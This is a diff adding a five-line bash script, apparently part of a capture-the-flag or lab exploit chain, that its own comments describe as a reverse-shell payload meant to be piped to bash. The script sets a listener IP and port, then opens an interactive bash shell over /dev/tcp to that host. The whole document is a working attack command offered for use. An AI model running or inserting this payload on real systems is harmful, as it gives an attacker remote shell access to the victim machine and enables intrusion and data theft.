@@ -1,0 +1,5 @@
+#!/bin/bash
+# Simple payload for include a reverse shell when piped to bash.
+RPORT=9074           # Port of your http server
+RHOST="10.10.14.27"  # Your local IP address
+bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
